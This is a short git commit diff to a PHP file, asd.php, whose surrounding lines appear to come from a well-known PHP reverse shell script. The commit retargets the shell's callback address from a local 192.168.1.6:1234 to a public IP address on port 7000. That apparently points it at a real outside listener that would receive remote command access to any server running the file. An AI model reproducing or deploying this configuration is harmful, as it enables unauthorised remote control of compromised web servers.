ec38f2623c7b85a1648461306c18f15174891372
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-16 01:29:47 +0300

    Update asd.php

--- asd.php
+++ asd.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.1.6';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '185.194.175.132';  // CHANGE THIS
+$port = 7000;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
